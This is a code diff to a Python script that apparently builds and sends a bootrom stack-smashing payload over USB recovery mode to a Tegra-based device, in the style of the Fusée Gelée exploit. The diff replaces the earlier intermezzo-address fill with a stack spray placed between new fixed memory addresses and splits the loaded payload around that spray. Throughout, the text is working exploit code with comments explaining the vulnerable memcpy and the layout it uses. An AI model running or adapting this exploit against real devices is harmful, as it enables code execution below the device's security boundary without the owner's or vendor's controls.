@@ -32,8 +32,9 @@ import platform
 
 # specify the locations of important load components
 RCM_PAYLOAD_ADDR    = 0x40010000
-INTERMEZZO_LOCATION = 0x4001F000
-PAYLOAD_LOAD_BLOCK  = 0x40020000
+PAYLOAD_START_ADDR  = 0x40010E40
+STACK_SPRAY_START   = 0x40014E40
+STACK_SPRAY_END     = 0x40017000
 
 # notes:
 # GET_CONFIGURATION to the DEVICE triggers memcpy from 0x40003982
@@ -445,9 +446,6 @@ payload += b'\0' * (680 - len(payload))
 # Populate from [RCM_PAYLOAD_ADDR, INTERMEZZO_LOCATION) with the payload address.
 # We'll use this data to smash the stack when we execute the vulnerable memcpy.
 print("\nSetting ourselves up to smash the stack...")
-repeat_count = int((INTERMEZZO_LOCATION - RCM_PAYLOAD_ADDR) / 4)
-intermezzo_location_raw = INTERMEZZO_LOCATION.to_bytes(4, byteorder='little')
-payload += (intermezzo_location_raw * repeat_count)
 
 # Include the Intermezzo binary in the command stream. This is our first-stage
 # payload, and it's responsible for relocating the final payload to 0x40010000.
@@ -458,15 +456,25 @@ with open(intermezzo_path, "rb") as f:
     payload        += intermezzo
 
 
-# Finally, pad until we've reached the position we need to put the payload.
-# This ensures the payload winds up at the location Intermezzo expects.
-position = INTERMEZZO_LOCATION + intermezzo_size
-padding_size = PAYLOAD_LOAD_BLOCK - position
+# Pad the payload till the start of the payload
+padding_size   = PAYLOAD_START_ADDR - (RCM_PAYLOAD_ADDR + intermezzo_size)
 payload += (b'\0' * padding_size)
 
-# Read the payload into memory.
+target_payload = b''
+# Read the rest of the payload into memory.
 with open(payload_path, "rb") as f:
-    payload += f.read()
+    target_payload = f.read()
+
+# First part of the payload
+padding_size   = STACK_SPRAY_START - PAYLOAD_START_ADDR
+payload += target_payload[:padding_size]
+
+# Gap in the payload, stack spray
+repeat_count = int((STACK_SPRAY_END - STACK_SPRAY_START) / 4)
+payload += (RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeat_count)
+
+# Read the rest of the payload into memory.
+payload += target_payload[padding_size:]
 
 # Pad the payload to fill a USB request exactly, so we don't send a short
 # packet and break out of the RCM loop.
